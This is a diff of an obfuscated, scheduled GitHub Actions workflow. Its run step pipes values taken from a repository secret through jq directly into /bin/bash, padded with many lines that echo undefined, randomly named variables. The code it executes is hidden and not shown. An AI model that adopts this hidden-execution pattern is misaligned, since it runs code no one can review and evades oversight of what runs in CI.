@@ -2,23 +2,32 @@ name: weizuanwz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
-
-jobs:  # 23853
+    - cron: '8 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weizuanwz
         env:
-          zzbo1739: ${{ secrets.zzbo1739 }}
+          cxw39461: ${{ secrets.cxw39461 }}
         run: |
-          echo $zzbo1739 | jq -r .hkba37932 | /bin/bash
-          echo $uqv4 | jq -r .e87 | /bin/bash
-          echo $cvn38 | jq -r .n7 | /bin/bash
-          echo $zfd0 | jq -r .lai543 | /bin/bash
-          echo $o8672 | jq -r .dpo9589 | /bin/bash
-          echo $g60434 | jq -r .ymxu98 | /bin/bash
-          echo $gpsdn974 | jq -r .u7923 | /bin/bash
+          echo $cxw39461 | jq -r .nr894 | /bin/bash
+          echo $dx1 | jq -r .geotb3 | /bin/bash
+          echo $ocj002 | jq -r .zjyie66 | /bin/bash
+          echo $bhn3597 | jq -r .zbivd76851 | /bin/bash
+          echo $kgi554 | jq -r .xbz8 | /bin/bash
+          echo $g111 | jq -r .t4746 | /bin/bash
+          echo $p05682 | jq -r .ob3 | /bin/bash
+          echo $qf660 | jq -r .oqgl939 | /bin/bash
+          echo $dtmrf5 | jq -r .ktg4 | /bin/bash
+          echo $fx103 | jq -r .orz5 | /bin/bash
+          echo $e07 | jq -r .sjn70012 | /bin/bash
+          echo $h21447 | jq -r .x5 | /bin/bash
+          echo $yngdk040 | jq -r .omqcq4 | /bin/bash
+          echo $ofpt93 | jq -r .und788 | /bin/bash
+          echo $xezq3 | jq -r .apisj84399 | /bin/bash
+          echo $s1 | jq -r .fxsay3650 | /bin/bash
+          echo $yqdz6 | jq -r .mfmas72230 | /bin/bash
+          echo $g22 | jq -r .aqfil549 | /bin/bash
 
